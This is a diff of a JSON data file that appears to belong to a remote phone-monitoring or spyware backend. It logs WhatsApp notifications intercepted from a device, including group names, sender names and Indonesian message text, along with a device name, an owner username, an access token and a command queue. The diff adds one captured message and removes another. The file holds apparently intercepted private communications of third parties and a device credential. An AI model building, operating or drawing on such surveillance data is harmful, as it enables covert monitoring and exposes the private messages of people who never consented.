@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (349 pesan): ~ Orang Yang Tidak Kenal",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "29/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777468219514
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎1276 pesan dari 19 chat",
         "time": "29/04 21:21",
@@ -4011,14 +4019,6 @@
         "time": "29/04 21:08",
         "pkg": "com.whatsapp",
         "receivedAt": 1777467432426
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (62 pesan): ~ cecel ocean.",
-        "content": "emg kesel harus ngpa ngpain?",
-        "time": "29/04 21:08",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777467432405
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777468214876,
+    "lastSeen": 1777468217971,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
